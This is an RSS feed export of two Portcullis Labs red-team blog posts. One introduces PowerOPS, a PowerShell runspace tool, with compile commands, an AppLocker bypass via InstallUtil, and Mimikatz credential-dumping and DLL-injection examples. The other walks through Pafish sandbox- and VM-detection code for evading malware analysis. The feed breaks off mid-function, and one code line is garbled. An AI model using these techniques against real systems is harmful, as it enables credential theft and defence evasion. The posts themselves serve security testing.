@@ -1,0 +1,788 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Portcullis Labs &#187; RFR</title>
+	<atom:link href="https://labs.portcullis.co.uk/author/rfr/feed/" rel="self" type="application/rss+xml" />
+	<link>https://labs.portcullis.co.uk</link>
+	<description>Research and Development</description>
+	<language>en-US</language>
+		<sy:updatePeriod>hourly</sy:updatePeriod>
+		<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>http://wordpress.org/?v=3.8.5</generator>
+	<item>
+		<title>PowerOPS: PowerShell for Offensive Operations</title>
+		<link>https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/</link>
+		<comments>https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/#comments</comments>
+		<pubDate>Fri, 03 Jun 2016 12:17:41 +0000</pubDate>
+		<dc:creator><![CDATA[RFR]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[red team]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=5467</guid>
+		<description><![CDATA[<p>At Portcullis, one of the most frequent assessments we perform are breakouts. One of the main challenges we face during these assessments is to get command execution that can either help escalate our privileges or allow us to gain access to different systems on the network. Sometimes we find harsh group policy restrictions in place [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/">PowerOPS: PowerShell for Offensive Operations</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>At Portcullis, one of the most frequent assessments we perform are breakouts. One of the main challenges we face during these assessments is to get command execution that can either help escalate our privileges or allow us to gain access to different systems on the network. <span id="more-5467"></span></p>
+<p>Sometimes we find harsh group policy restrictions in place that block access to the Windows Command Prompt, PowerShell, among others. These, however, are not always properly implemented, i.e. they do not block access to all executables (and allow only certain programs to run).</p>
+<p>After getting command execution, we want to attack other systems on the network. However it isn&#8217;t always easy to get a flexible toolbox in the system that allow us to gather information and launch further attacks. PowerShell is our preferred post-exploitation language and powershell.exe access is usually blocked (as .ps1 scripts). However since the block is often incorrectly implemented, i.e. the DLLs used by PowerShell aren&#8217;t usually blocked, this can open some doors. On top of that some AVs started implementing some basic signatures that will pick some well known PowerShell scripts. The bypass is trivial but we want to be as stealthy as possible and it still delay us a bit. </p>
+<p>How can we bypass some of these &#8220;security mitigations&#8221; and speed up our tests? PowerOPS is an application written in C# that does not rely on powershell.exe but runs PowerShell commands and functions within a PowerShell runspace environment (.NET). Besides this, it includes multiple offensive PowerShell modules to make the process of post-exploitation easier.</p>
+<p>It tries to follow the KISS principle, being as simple as possible. The main goal is to make it easy to use PowerShell offensively and help to evade Anti-Virus and other mitigations.</p>
+<p>To do this, it:</p>
+<ul>
+<li>Doesn&#8217;t rely on powershell.exe, it calls PowerShell directly through the .NET framework, which might help bypassing security controls like GPO, SRP and App Locker</li>
+<li>Powershell functions within the Runspace are loaded in memory from Base64 Encoded Strings and never touch disk, evading most Anti-Virus engines</li>
+</ul>
+<h2>What’s inside the runspace?</h2>
+<p><a title="PowerShellMafia/Powersploit" href="https://github.com/PowerShellMafia/PowerSploit">PowerShellMafia/Powersploit</a></p>
+<ul>
+<li>Get-Keystrokes</li>
+<li>Invoke-DllInjection</li>
+<li>Invoke-Mimikatz</li>
+<li>Invoke-NinjaCopy</li>
+<li>Invoke-Shellcode</li>
+<li>Invoke-ReflectivePEInjection</li>
+<li>Invoke-TokenManipulation</li>
+<li>Invoke-WMICommand</li>
+<li>PowerUp</li>
+<li>PowerView</li>
+</ul>
+<p><a title="Nishang" href="https://github.com/samratashok/nishang">Nishang</a></p>
+<ul>
+<li>Get-Information</li>
+<li>Get-PassHashes</li>
+<li>Port-Scan</li>
+</ul>
+<p><a title="Auto-GPPPassword" href="https://github.com/roo7break/PowerShell-Scripts/blob/master/auto-gpppassword/auto-gpppassword.ps1">Auto-GPPPassword</a></p>
+<p><a title="PowerCat" href="https://github.com/besimorhino/powercat">PowerCat</a></p>
+<p><a title="Get-ProductKey" href="https://gallery.technet.microsoft.com/scriptcenter/Get-product-keys-of-local-83b4ce97">Get-ProductKey</a></p>
+<p><a title="Empire" href="https://github.com/PowerShellEmpire/">Empire</a></p>
+<ul>
+<li>Invoke-Psexec</li>
+<li>Invoke-SSHCommand</li>
+</ul>
+<p>Additionally you can run any valid PowerShell command.</p>
+<h2>Where to get it?</h2>
+<p>The source code is available at <a title="GitHub" href="https://github.com/fdiskyou/PowerOPS">GitHub</a>.</p>
+<h2>How to compile it</h2>
+<p>To compile PowerOPS you need to import this project within Microsoft Visual Studio or if you don&#8217;t have access to a Visual Studio installation, you can compile it as follows:</p>
+<p>To compile it as an x86 binary:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+C:\&gt; cd C:\Windows\Microsoft.NET\Framework64\v4.0.30319 (Or newer .NET version folder)
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\&gt; csc.exe /unsafe /reference:&quot;C:\path\to\System.Management.Automation.dll&quot; /reference:System.IO.Compression.dll /out:C:\users\username\PowerOPS_x86.exe /platform:x86 &quot;C:\path\to\PowerOPS\PowerOPS\*.cs&quot;
+</pre>
+<p>To compile it as an x64 binary:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+C:\&gt; cd C:\Windows\Microsoft.NET\Framework64\v4.0.30319 (Or newer .NET version folder)
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\&gt; csc.exe /unsafe /reference:&quot;C:\path\to\System.Management.Automation.dll&quot; /reference:System.IO.Compression.dll /out:C:\users\username\PowerOPS_x64.exe /platform:x64 &quot;C:\path\to\PowerOPS\PowerOPS\*.cs&quot;
+</pre>
+<p>PowerOPS uses the System.Management.Automation namespace, so make sure you have the System.Management.Automation.dll within your source path when compiling outside of Visual Studio.</p>
+<h2>How to use it</h2>
+<p>Just run the binary and type show to list available modules.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+PS &gt; show
+
+[-] This computer is not part of a Domain! Some functions will not work!
+
+[+] Nishang
+
+ Get-Information    Get-PassHashes             Port-Scan
+
+[+] PowerSploit
+
+ Get-KeyStrokes     Invoke-DllInjection        Invoke-Mimikatz     Invoke-NinjaCopy
+ Invoke-Shellcode   Invoke-TokenManipulation   Invoke-WmiCommand   Invoke-ReflectivePEInjection
+ PowerView          PowerUp
+
+[+] Empire
+
+ Invoke-PsExec      Invoke-SSHCommand
+
+[+] Others
+
+ Auto-GPPPassword   Get-ProductKey             PowerCat
+
+PS &gt;
+</pre>
+<p>PowerUp and PowerView are loaded as modules, so Get-Command -module will show you all available functions.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+PS &gt; get-command -module powerup
+
+CommandType     Name                                               ModuleName
+-----------     ----                                               ----------
+Function        Find-DLLHijack                                     PowerUp
+Function        Find-PathHijack                                    PowerUp
+Function        Get-ApplicationHost                                PowerUp
+Function        Get-ModifiableFile                                 PowerUp
+Function        Get-RegAlwaysInstallElevated                       PowerUp
+Function        Get-RegAutoLogon                                   PowerUp
+Function        Get-ServiceDetail                                  PowerUp
+Function        Get-ServiceFilePermission                          PowerUp
+Function        Get-ServicePermission                              PowerUp
+Function        Get-ServiceUnquoted                                PowerUp
+Function        Get-UnattendedInstallFile                          PowerUp
+Function        Get-VulnAutoRun                                    PowerUp
+Function        Get-VulnSchTask                                    PowerUp
+Function        Get-Webconfig                                      PowerUp
+Function        Install-ServiceBinary                              PowerUp
+Function        Invoke-AllChecks                                   PowerUp
+Function        Invoke-ServiceAbuse                                PowerUp
+Function        Invoke-ServiceDisable                              PowerUp
+Function        Invoke-ServiceEnable                               PowerUp
+Function        Invoke-ServiceStart                                PowerUp
+Function        Invoke-ServiceStop                                 PowerUp
+Function        Restore-ServiceBinary                              PowerUp
+Function        Test-ServiceDaclPermission                         PowerUp
+Function        Write-HijackDll                                    PowerUp
+Function        Write-ServiceBinary                                PowerUp
+Function        Write-UserAddMSI                                   PowerUp
+
+PS &gt;
+</pre>
+<p>All your PowerShell fu applies. PowerOPS is basically a PowerShell shell with some modules/functions pre-loaded. So Get-Help is your friend and will help you to understand how the modules can be used.</p>
+<p>Let&#8217;s say you want to see examples on how to use Invoke-Mimikatz.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+PS &gt; Get-Help Invoke-Mimikatz -examples
+
+NAME
+    Invoke-Mimikatz
+
+SYNOPSIS
+    This script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to
+    reflectively load Mimikatz completely in memory. This allows you to do
+    things such as
+    dump credentials without ever writing the mimikatz binary to disk.
+    The script has a ComputerName parameter which allows it to be executed
+    against multiple computers.
+
+    This script should be able to dump credentials from any version of Windows
+    through Windows 8.1 that has PowerShell v2 or higher installed.
+
+    Function: Invoke-Mimikatz
+    Author: Joe Bialek, Twitter: @JosephBialek
+    Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog:
+    http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter
+    @gentilkiwi
+    License:  http://creativecommons.org/licenses/by/3.0/fr/
+    Required Dependencies: Mimikatz (included)
+    Optional Dependencies: None
+    Version: 1.5
+    ReflectivePEInjection version: 1.1
+    Mimikatz version: 2.0 alpha (2/16/2015)
+
+    -------------------------- EXAMPLE 1 --------------------------
+
+    C:\PS&gt;Execute mimikatz on the local computer to dump certificates.
+
+
+    Invoke-Mimikatz -DumpCerts
+
+
+    -------------------------- EXAMPLE 2 --------------------------
+
+    C:\PS&gt;Execute mimikatz on two remote computers to dump credentials.
+
+
+    Invoke-Mimikatz -DumpCreds -ComputerName @(&quot;computer1&quot;, &quot;computer2&quot;)
+
+
+    -------------------------- EXAMPLE 3 --------------------------
+
+    C:\PS&gt;Execute mimikatz on a remote computer with the custom command
+    &quot;privilege::debug exit&quot; which simply requests debug privilege and exits
+
+
+    Invoke-Mimikatz -Command &quot;privilege::debug exit&quot; -ComputerName &quot;computer1&quot;
+
+
+PS &gt;
+</pre>
+<p>Or simply look at the whole help available for Invoke-DllInjection.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+PS &gt; Get-Help Invoke-DllInjection -full
+
+NAME
+    Invoke-DllInjection
+
+SYNOPSIS
+    Injects a Dll into the process ID of your choosing.
+
+    PowerSploit Function: Invoke-DllInjection
+    Author: Matthew Graeber (@mattifestation)
+    License: BSD 3-Clause
+    Required Dependencies: None
+    Optional Dependencies: None
+
+SYNTAX
+    Invoke-DllInjection [-ProcessID] &lt;Int32&gt; [-Dll] &lt;String&gt;
+    [&lt;CommonParameters&gt;]
+
+
+DESCRIPTION
+    Invoke-DllInjection injects a Dll into an arbitrary process.
+
+
+PARAMETERS
+    -ProcessID &lt;Int32&gt;
+        Process ID of the process you want to inject a Dll into.
+
+        Required?                    true
+        Position?                    1
+        Default value                0
+        Accept pipeline input?       false
+        Accept wildcard characters?  false
+
+    -Dll &lt;String&gt;
+        Name of the dll to inject. This can be an absolute or relative path.
+
+        Required?                    true
+        Position?                    2
+        Default value
+        Accept pipeline input?       false
+        Accept wildcard characters?  false
+
+    &lt;CommonParameters&gt;
+        This cmdlet supports the common parameters: Verbose, Debug,
+        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
+        OutBuffer, PipelineVariable, and OutVariable. For more information, see
+        about_CommonParameters (http://go.microsoft.com/fwlink/?LinkID=113216).
+
+INPUTS
+
+OUTPUTS
+
+NOTES
+        Use the '-Verbose' option to print detailed information.
+
+    -------------------------- EXAMPLE 1 --------------------------
+
+    C:\PS&gt;Invoke-DllInjection -ProcessID 4274 -Dll evil.dll
+
+
+    Description
+    -----------
+    Inject 'evil.dll' into process ID 4274.
+
+RELATED LINKS
+
+http://www.exploit-monday.com
+
+PS &gt;
+</pre>
+<p>You can play around with the output&#8230;</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+PS &gt; get-productkey
+
+OSDescription        Computername        OSVersion           ProductKey
+-------------        ------------        ---------           ----------
+Microsoft Windows... VISUALSTUDIO        6.1.7601            ABCDE-54321-UVXY...
+
+
+
+PS &gt; get-productkey | format-list
+
+
+OSDescription : Microsoft Windows 7 Professional N
+Computername  : VISUALSTUDIO
+OSVersion     : 6.1.7601
+ProductKey    : ABCDE-54321-UVXYZ-12345-LMNOP
+</pre>
+<p>Save the output of your commands the way you want&#8230;</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+PS &gt; invoke-allchecks | Out-File -Encoding ascii powerup.output.txt
+
+PS &gt; type powerup.output.txt
+
+[*] Running Invoke-AllChecks
+
+[*] Checking if user is in a local group with administrative privileges...
+[+] User is in a local group that grants administrative privileges!
+[+] Run a BypassUAC attack to elevate privileges to admin.
+
+[*] Checking for unquoted service paths...
+
+[*] Checking service executable and argument permissions...
+
+[*] Checking service permissions...
+
+[*] Checking %PATH% for potentially hijackable .dll locations...
+
+[*] Checking for AlwaysInstallElevated registry key...
+
+[*] Checking for Autologon credentials in registry...
+
+[*] Checking for vulnerable registry autoruns and configs...
+
+[*] Checking for vulnerable schtask files/configs...
+
+[*] Checking for unattended install files...
+
+[*] Checking for encrypted web.config strings...
+
+[*] Checking for encrypted application pool and virtual directory passwords...
+
+PS &gt;
+</pre>
+<p>Do some math&#8230;</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+PS &gt; $a=1
+
+PS &gt; $b=4
+
+PS &gt; $c=$a+$b
+
+PS &gt; echo $c
+5
+</pre>
+<p>Browse the file system&#8230;</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+PS &gt; cd c:\
+
+PS &gt; ls
+
+    Directory: C:\
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+d----        14/02/2016     17:21            bin
+d----        17/02/2016     15:02            Dev-Cpp
+d----        14/07/2009     04:20            PerfLogs
+d-r--        26/04/2016     20:00            Program Files
+d-r--        26/04/2016     20:00            Program Files (x86)
+d----        19/02/2016     21:06            Python27
+d-r--        26/11/2015     17:20            Users
+d----        12/05/2016     15:53            Windows
+-a---        19/03/2010     23:55    2073703 VS_EXPBSLN_x64_enu.CAB
+-a---        19/03/2010     23:58     551424 VS_EXPBSLN_x64_enu.MSI
+
+PS &gt; pwd
+
+Path
+----
+C:\
+
+PS &gt;
+</pre>
+<p>And so on&#8230;</p>
+<p><a title="PowerShell v5" href="https://mva.microsoft.com/en-US/training-courses/what-s-new-in-powershell-v5-16434">PowerShell v5</a> is coming with some new security features that will certainly affect some of the payloads contained in PowerOPS, so further development is expected as well as addition of new attack modules.</p>
+<h3>AppLocker bypass</h3>
+<p>PowerOPS includes the InstallUtil AppLocker bypass technique from <a title="Casey Smith" href="https://twitter.com/subTee">Casey Smith</a>. To make use of it run as shown below:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+C:\&gt; cd \Windows\Microsoft.NET\Framework\v4.0.30319 (Or newer .NET version folder)
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\&gt; InstallUtil.exe /logfile= /LogToConsole=false /U C:\path\to\PowerOPS.exe
+</pre>
+<h4>Credits</h4>
+<p>PowerOPS was inspired by <a title="Cn33liz/p0wnedShell" href="https://github.com/Cn33liz/p0wnedShell">Cn33liz/p0wnedShell</a>, and basically consists of work from <a title="Nikhil Mittal" href="http://www.labofapenetrationtester.com/">Nikhil Mittal</a> of Nishang, <a title="mattifiestation" href="https://twitter.com/mattifestation">mattifiestation</a> of PowerSploit and <a title="sixdub" href="https://twitter.com/sixdub">sixdub</a>, <a title="engima0x3" href="https://twitter.com/enigma0x3">engima0x3</a> and <a title="harmj0y" href="https://twitter.com/HarmJ0y">harmj0y</a> of Empire.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/">PowerOPS: PowerShell for Offensive Operations</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Sandbox detection: Pafish overview</title>
+		<link>https://labs.portcullis.co.uk/blog/sandbox-detection-pafish-overview/</link>
+		<comments>https://labs.portcullis.co.uk/blog/sandbox-detection-pafish-overview/#comments</comments>
+		<pubDate>Mon, 14 Mar 2016 20:15:03 +0000</pubDate>
+		<dc:creator><![CDATA[RFR]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[blue team]]></category>
+		<category><![CDATA[red team]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=5415</guid>
+		<description><![CDATA[<p>Here at Portcullis, we are frequently involved in &#8220;red team&#8221; exercises, which means we subject an organisation&#8217;s information security systems to rigorous testing and analysis. The opposite of a red team is a &#8220;blue team&#8221;. A blue team attempts to identify and stop the red team from compromising systems. One of the techniques used when [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/sandbox-detection-pafish-overview/">Sandbox detection: Pafish overview</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Here at Portcullis, we are frequently involved in &#8220;red team&#8221; exercises, which means we subject an organisation&#8217;s information security systems to rigorous testing and analysis. The opposite of a red team is a &#8220;blue team&#8221;. A blue team attempts to identify and stop the red team from compromising systems. One of the techniques used when red teaming is to write malicious code to test the security systems of our clients. One of the issues we face resides in the fact that we need to bypass sandbox systems that analyse our files in real-time to identify if the potentially malicious file should be blocked and Indicators Of Compromise (IOCs) generated or if the files are benign and safe. At the same time, blue teams that catch our files will try to reverse engineer them in order to understand how we may be compromising systems. Even though the last point is not really relevant for us (ultimately we&#8217;re not the bad guys), the first point is.<span id="more-5415"></span></p>
+<p>In order to be able to mitigate this issue, our code needs to be able to detect if it is being run inside a debugger, a Virtual Machine (VM) or a sandbox. There are some well known open source projects that are able to achieve this that are often used by malware writers. One of the most well known is called Pafish, Paranoid Fish, the code for which can be found in the <a title="Pafish GitHub repo" href="https://github.com/a0rtega/pafish/">Pafish GitHub repo</a>. So I decided to take a look at the code and go through all the tricks Pafish has in order to assess if they should be incorporated in to our exercises. If our code is running inside a debugger, VM or sandbox it should deviate from it&#8217;s original path and do something legitimate or terminate immediately. If it isn&#8217;t running in any of these environments it should run it&#8217;s malicious code and infect the system.</p>
+<p>Pafish is written in C and can be built with MinGW (gcc + make) as it says on its official GitHub web site.</p>
+<p>To build pafish you will basically need to install mingw-w64 and make. After unziping the <a title="Pafish source code" href="https://github.com/a0rtega/pafish/archive/master.zip">Pafish source code</a>, we can see the project source has different source code files, each one used for different detection purposes.</p>
+<ul>
+<li>Detect a debugger: debuggers.c</li>
+<li>Detect a sandbox: gensandbox.c</li>
+<li>Detect hooked functions: hooks.c</li>
+<li>Detect VirtualBox: vbox.c</li>
+<li>Detect VMWare: vmware.c</li>
+<li>Detect Qemu: qemu.c</li>
+<li>Detect Bochs: bochs.c</li>
+<li>Detect Cuckoo: cuckoo.c</li>
+<li>Detect Sandboxie: sandboxie.c</li>
+<li>Detect Wine: wine.c</li>
+</ul>
+<p>In the next sections I&#8217;ll take a quick look at each one of these files. As you can see some sandboxes are missing, like FireEye, AMP Threat Grid from Cisco, Maltracker from AnubisNetworks, among others. By looking at these techniques we might find insights on how to bypass them if we find one in use at our clients during our engagements.</p>
+<h2>debuggers.c</h2>
+<p>By opening debuggers.c, we can see the first method implemented by Pafish. The <a title="IsDebuggerPresent()" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms680345%28v=vs.85%29.aspx">IsDebuggerPresent()</a> function is a Win32 API function that can be used to determine whether the calling process is being debugged by a debugger.</p>
+<p>Still on debuggers.c we can see another function called debug_outputdebugstring(). This uses another function from the Win32 API, <a title="OutputDebugString()" href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa363362%28v=vs.85%29.aspx">OutputDebugString()</a>. According to MSDN, this function &#8220;sends a string to the debugger for display&#8221;. This is exactly what this code does. If the application is not running under a debugger the string will be sent to system&#8217;s debugger to be displayed with the DbgPrint() function from the Windows Driver Kit (WDK). If the application is not running inside a debugger and there is no system debugger then the OutputDebugString() does nothing. If the function doesn&#8217;t return an error the process is not being debugged. Otherwise it concludes it is running inside a debugger.</p>
+<h2>gensandbox.c</h2>
+<p>Another interesting file for us is gensandbox.c. This file contains 12 functions that it uses to detect a sandbox. The first one, gensandbox_mouse_act() uses <a title="GetCursorPos()" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms648390%28v=vs.85%29.aspx">GetCursorPos()</a> to determine the position of the mouse cursor and whether it is actively being used. According to MSDN this function &#8220;retrieves the position of the mouse cursor, in screen coordinates&#8221;. Now if you look at the function code that does the actual detection, you can see that the function first calls the GetCursorPos() function in order to receive cursor co-ordinates and saves them into the position1 variable. After that it sleeps for 2000 milliseconds (i.e. 2 seconds), and then calls the same function again, this time saving the coordinates into the position2 variable. Afterwards, the two samples of the x and y coordinates of the mouse cursor are compared to one other. This determines whether the mouse cursor has changed between the two GetCursorPos() function calls. If the position of the mouse cursor has not changed then there was no mouse activity during the sleep function. Under such circumstances, the code will conclude that it is being run within a sandbox.</p>
+<p>Another interesting function in this file is gensandbox_username(). It uses the <a title="GetUserName()" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms724432%28v=vs.85%29.aspx">GetUserName</a> function that retrieves the name of the user associated with the current thread. After that all the lower case letters are converted to upper case letters and the name is compared with the following strings:</p>
+<ul>
+<li>SANDBOX</li>
+<li>VIRUS</li>
+<li>MALWARE</li>
+</ul>
+<p>The strstr() function is used to detect any occurrence of the presented strings in the username. If one of the strings above is found, it means that the program is being run inside a sandbox. Otherwise it returns FALSE. This method is highly questionable but gives us some insights on how one might either bypass it (if one was part of the &#8220;red team&#8221;) or create a better sandbox (if playing for the &#8220;blue team&#8221;).</p>
+<p>The next function, called gensandbox_path(), is using <a title="GetModuleFileName()" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms683197%28v=vs.85%29.aspx">GetModuleFileName()</a>. According to MSDN this function &#8220;retrieves the fully qualified path for the file that contains the specified module. The module must have been loaded by the current process&#8221;.</p>
+<p>Here, the strstr() function is used to check whether the retrieved path contains any of the strings:</p>
+<ul>
+<li>\\SAMPLE</li>
+<li>\\VIRUS</li>
+<li>SANDBOX</li>
+</ul>
+<p>If that&#8217;s the case it concludes that it is running within a sandbox. Again, we can see multiple ways to improve this code and also get some ideas on how to apply this thinking to detect other environments even though, as you can see, it is a pretty basic technique.</p>
+<p>gensandbox_common_names(), takes a similar approach but looks for the following strings instead:</p>
+<ul>
+<li>sample.exe</li>
+<li>malware.exe</li>
+</ul>
+<p>Another interesting function is gensandbox_drive_size(). This checks if the first physical drive is larger than 60GB by using the <a title="CreateFile()" href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858%28v=vs.85%29.aspx">CreateFile()</a> and <a title="DeviceIoControl()" href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa363216%28v=vs.85%29.aspx">DeviceIoControl()</a> functions. As we can read on MSDN, the CreateFile() function &#8220;creates or opens a file or I/O device. The most commonly used I/O devices are as follows: file, file stream, directory, physical disk, volume, console buffer, tape drive, communications resource, mailslot, and pipe. The function returns a handle that can be used to access the file or device for various types of I/O depending on the file or device and the flags and attributes specified&#8221;. Using a handle retrieved using the CreateFile() function call, the DeviceIoControl() function is used to send a control code directly to a specified device driver, causing the corresponding device to perform the IOCTL_DISK_GET_LENGTH_INFO operation.</p>
+<p>Once again, this is tricky but it is almost always true these days. People don&#8217;t like to allocate that much disk space for their testing VMs.</p>
+<p>Pafish also has a second function that plays with the size of the C drive, gensandbox_drive_size2(). It basically checks for the amount of free space on drive C. Again, this can be tricky, I&#8217;ve seen production servers (mostly databases) running out of space due to a lack of good sysadmin practices and bad planning. And yes&#8230; this happens a lot.</p>
+<p>Another interesting function is gensandbox_uptime(). It uses <a title="GetTickCount()" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms724408%28v=vs.85%29.aspx">GetTickCount()</a> function to retrieve the number of milliseconds that have elapsed since the system was started (up to 49.7 days).</p>
+<p>Once again, the assumption done here might be wrong if we think about laptops. Remember, the whole purpose of this analysis is to apply this code to our &#8220;red team&#8221; exercies, where desktop users are usually the target.</p>
+<p>There are some more small functions inside gensandbox.c that I&#8217;d recommend you to have a look. These can also give some good insights to detect other sandboxes.</p>
+<ul>
+<li>gensandbox_sleep_patched()</li>
+<li>gensandbox_one_cpu()</li>
+<li>gensandbox_one_cpu_GetSystemInfo()</li>
+<li>gensandbox_less_than_onegb()</li>
+<li>gensandbox_IsNativeVhdBoot()</li>
+</ul>
+<h2>hooks.c</h2>
+<p>The hooks.c source code only contains four small functions. Their aim is detect if any of the following functions have been hooked:</p>
+<ul>
+<li>DeleteFileW</li>
+<li>ShellExecuteExW</li>
+<li>CreateProcessA</li>
+</ul>
+<p>Here&#8217;s the whole code:</p>
+<pre class="brush: cpp; gutter: false; title: ; notranslate">]
+static int check_hook_m1(DWORD * dwAddress) {
+	BYTE *b = (BYTE *)dwAddress;
+	return (*b == 0x8b) &amp;&amp; (*(b+1) == 0xff) ? FALSE : TRUE;
+}
+
+/* Causes FP in Win 8 */
+int check_hook_DeleteFileW_m1() {
+	return check_hook_m1((DWORD *)DeleteFileW);
+}
+
+int check_hook_ShellExecuteExW_m1() {
+	return check_hook_m1((DWORD *)ShellExecuteExW);
+}
+
+int check_hook_CreateProcessA_m1() {
+	return check_hook_m1((DWORD *)CreateProcessA);
+}
+</pre>
+<p>Basically each one of the functions store the the address of the function (either <a title="DeleteFileW()" href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa363915%28v=vs.85%29.aspx">DeleteFileW()</a>, <a title="ShellExecuteExW()" href="https://msdn.microsoft.com/en-us/library/windows/desktop/bb762154%28v=vs.85%29.aspx">ShellExecuteExW()</a> or <a title="CreateProcessA()" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425%28v=vs.85%29.aspx">CreateProcessA()</a>) into the dwAddress variable of the check_hook_m1() function.</p>
+<p>Then it checks whether the first two bytes of the function are 0xff8b, which represent the assembly instruction for jump back instruction. Usually the functions create a new stack frame upon being called, but the jmp instruction at the beginning of a function clearly indicates the function has been hooked.</p>
+<h2>vbox.c/vmware.c/qemu.c</h2>
+<p>The code to detect VirtualBox is quite extensive and there are multiple functions that look for Windows Registry keys. Here are those functions:</p>
+<pre class="brush: cpp; gutter: false; title: ; notranslate">]
+/**
+* SCSI registry key check
+**/
+int vbox_reg_key1() {
+	return pafish_exists_regkey_value_str(HKEY_LOCAL_MACHINE, &quot;HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0&quot;, &quot;Identifier&quot;, &quot;VBOX&quot;);
+}
+
+/**
+* SystemBiosVersion registry key check
+**/
+int vbox_reg_key2() {
+	return pafish_exists_regkey_value_str(HKEY_LOCAL_MACHINE, &quot;HARDWARE\\Description\\System&quot;, &quot;SystemBiosVersion&quot;, &quot;VBOX&quot;);
+}
+
+/**
+* VirtualBox Guest Additions key check
+**/
+int vbox_reg_key3() {
+	return pafish_exists_regkey(HKEY_LOCAL_MACHINE, &quot;SOFTWARE\\Oracle\\VirtualBox Guest Additions&quot;);
+}
+
+/**
+* VideoBiosVersion key check
+**/
+int vbox_reg_key4() {
+	return pafish_exists_regkey_value_str(HKEY_LOCAL_MACHINE, &quot;HARDWARE\\Description\\System&quot;, &quot;VideoBiosVersion&quot;, &quot;VIRTUALBOX&quot;);
+}
+
+/**
+* ACPI Regkey detection
+**/
+int vbox_reg_key5() {
+	return pafish_exists_regkey(HKEY_LOCAL_MACHINE, &quot;HARDWARE\\ACPI\\DSDT\\VBOX__&quot;);
+}
+
+/**
+* FADT ACPI Regkey detection
+**/
+int vbox_reg_key7() {
+	return pafish_exists_regkey(HKEY_LOCAL_MACHINE, &quot;HARDWARE\\ACPI\\FADT\\VBOX__&quot;);
+}
+
+/**
+* RSDT ACPI Regkey detection
+**/
+int vbox_reg_key8() {
+	return pafish_exists_regkey(HKEY_LOCAL_MACHINE, &quot;HARDWARE\\ACPI\\RSDT\\VBOX__&quot;);
+}
+
+/**
+* VirtualBox Services Regkey detection
+**/
+int vbox_reg_key9(int writelogs) {
+	int res = FALSE, i;
+	const int count = 5;
+	char message[200];
+
+	string strs1ount];
+	strs[0] = &quot;SYSTEM\\ControlSet001\\Services\\VBoxGuest&quot;;
+	strs[1] = &quot;SYSTEM\\ControlSet001\\Services\\VBoxMouse&quot;;
+	strs[2] = &quot;SYSTEM\\ControlSet001\\Services\\VBoxService&quot;;
+	strs[3] = &quot;SYSTEM\\ControlSet001\\Services\\VBoxSF&quot;;
+	strs[4] = &quot;SYSTEM\\ControlSet001\\Services\\VBoxVideo&quot;;
+	for (i=0; i &lt; count; i++) {
+		if (pafish_exists_regkey(HKEY_LOCAL_MACHINE, strs[i])) {
+			snprintf(message, sizeof(message)-sizeof(message[0]), &quot;VirtualBox traced using Reg key HKLM\\%s&quot;, strs[i]);
+			if (writelogs) write_log(message);
+			res = TRUE;
+		}
+	}
+	return res;
+}
+
+/**
+* HARDWARE\\DESCRIPTION\\System SystemBiosDate == 06/23/99
+**/
+int vbox_reg_key10() {
